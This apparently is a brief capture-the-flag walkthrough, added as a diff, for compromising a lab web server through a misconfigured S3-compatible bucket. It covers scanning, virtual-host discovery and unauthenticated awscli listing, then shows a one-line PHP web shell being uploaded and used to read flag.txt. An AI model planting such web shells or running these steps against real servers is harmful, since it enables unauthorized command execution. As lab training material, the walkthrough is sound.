@@ -1,0 +1,36 @@
+Reverse Shell up load to AWS S3 bucket
+
+first NMAP scan: sudo nmap -sS -sC target_ip -p- --min-rate 5000 -vv
+there are 2 tcp port is open 22(SSH) 80(HTTP).
+
+And then to search the domain name of the target_web (usally is its mail.)
+useful command : curl target_ip | grep "mail"
+
+Add the domain to the /etc/hosts file (result ip to domain name)
+
+then gobuster the target_web to search the subdomain in the web.
+useful command : gobuster vhost -u target-web -w your_wordlist(seclists) --append-domain
+
+and then find the s3.target_web is used aws s3 server, and it is a volneriability.
+Add the domain(s3.target-web) to the /etc/hosts file
+
+than use the awscli (apt install awscli)
+first init the aws config command : aws configure
+(the next config use default value is OK, just press "Enter")
+
+use aws command to link the s3 server:
+aws --endpoint=http://s3.target_web s3 ls (to list the files in s3)
+aws --endpoint=http://s3.target_web s3 ls s3://target_web (to list the web files in the dir)
+
+then we can prepare a reverse shell file (code) to upload to s3 server.
+revers shell file : shell.php  contain{ <?php system($_GET["cmd"]); ?> }
+usefull command : echo '<?php system($_GET["cmd"]); ?>' > shell.php
+
+upload the file to s3_server:
+aws --endpoint=http://s3.target_web s3 cp shell.php s3://target_web
+
+then you can use the reverse shell on the browser.
+example : target_web/shell.php?cmd=ls (to list the file in web dir)
+example : target_web/shell.php?cmd=ls .. (to list the file in parent dir)
+example : target_web/shell.php?cmd=cat ../flag.txt (to print the file of the pwd)
+
